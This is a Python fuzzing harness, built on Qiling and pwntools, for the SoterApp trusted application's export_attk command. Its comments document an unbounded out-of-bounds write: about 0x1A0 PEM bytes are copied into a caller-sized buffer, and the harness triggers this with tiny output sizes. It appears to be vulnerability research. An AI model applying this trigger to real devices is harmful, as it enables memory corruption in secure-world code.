from .params import *
from pwn import *
from qiling import Qiling
import struct, os

# === SoterApp cmd 0x1002 soter_export_attk -- unbounded OUT write ============
# Handler 0x21538. ptypes 0x661 = {p0: MEMREF_OUTPUT(6), p1: VALUE_INPUT(1)? no}.
# Re-derived: case@0x2037c does `ldr x0,[x20],#8 ; mov x1,x20 ; bl 0x21538`, i.e.
#   x0 = params[0].ptr (REE OUTPUT buf), x1 = &params[0].size (caller out-size).
# ptypes 0x661 -> nibbles p0=1? Let's just match what the dispatcher accepts: the
#   gate requires paramTypes==0x661. p0 is the memref the handler writes to.
#
# Gate inside handler (0x215a8): `ldr w8,[x1]; cbz w8 -> reject`. So out-size must
#   be != 0, but is NEVER bounded against the bytes written.
# Copy-out (0x217f8): writes "-----BEGIN PUBLIC KEY-----\n"(0x1b) + base64(N||E)
#   (~0x168) + "-----END PUBLIC KEY-----\n"(0x1a) ~= 0x1A0 bytes to params[0].ptr
#   with NO check vs out-size. A small out buffer => OOB write past the REE buffer.
#
# Precondition: ATTK must be provisioned. init_fuzz runs cmd 0x1000 (gen_attk)
# first in the SAME session/store, so soter_get_attk_pri (0x21228) finds the key.

OUT_SZ = int(os.environ.get("EXPORT_OUTSZ", "16"), 0)   # tiny but !=0 -> gate passes

def init_fuzz(emu, sid):
    print("[export_attk] init_fuzz: provisioning ATTK via cmd 0x1000 gen_attk")
    p = [ValueParam(0,0), NoneParam(), NoneParam(), NoneParam()]
    r = emu.InvokeCommand(sid, 0x1000, 0x3, p)
    print(f"[export_attk] gen_attk returned {r:#x}")

def place_input_callback(ql: Qiling, input: bytes, _: int):
    out_sz = OUT_SZ
    if len(input) >= 4 and "EXPORT_OUTSZ" not in os.environ:
        out_sz = (input[0] % 0x40) + 1   # explore tiny non-zero out sizes
    print(f"[export_attk] cmd=0x1002 export_attk out_sz={out_sz:#x} "
          f"(handler writes ~0x1A0 PEM bytes -> OOB past {out_sz:#x} redzoned out buf)")
    command_params = [
        MemRefParam(bytes(out_sz), out_sz),  # param0 OUTPUT (redzoned to out_sz)
        NoneParam(),
        NoneParam(),
        NoneParam(),
    ]
    setup_params_fuzz(ql, 0x1002, 0x6, command_params)
    return True
